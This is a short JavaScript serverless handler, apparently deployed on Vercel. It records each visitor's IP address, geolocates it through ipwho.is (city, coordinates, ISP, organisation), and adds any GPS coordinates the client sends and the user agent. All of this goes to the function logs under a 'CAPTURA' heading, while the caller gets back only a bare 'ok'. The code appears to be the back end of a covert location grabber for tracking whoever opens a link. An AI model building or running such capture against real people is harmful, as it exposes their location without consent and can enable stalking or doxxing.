module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const forwarded = req.headers['x-forwarded-for'];
  const ip = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;

  const body = req.body || {};

  // Geolocalização por IP via ipwho.is
  let ipGeo = null;
  try {
    const resp = await fetch(`https://ipwho.is/${ip}`);
    ipGeo = await resp.json();
  } catch (e) {
    ipGeo = { error: e.message };
  }

  const entry = {
    timestamp: new Date().toISOString(),
    ip,
    ip_geo: ipGeo ? {
      city: ipGeo.city,
      region: ipGeo.region,
      country: ipGeo.country,
      latitude: ipGeo.latitude,
      longitude: ipGeo.longitude,
      isp: ipGeo.connection?.isp,
      org: ipGeo.connection?.org,
    } : null,
    gps: body.gps || null,
    userAgent: req.headers['user-agent'],
  };

  // Log no console (aparece nos Function Logs da Vercel)
  console.log('========== CAPTURA ==========');
  console.log(JSON.stringify(entry, null, 2));
  console.log('=============================');

  res.status(200).json({ ok: true });
};
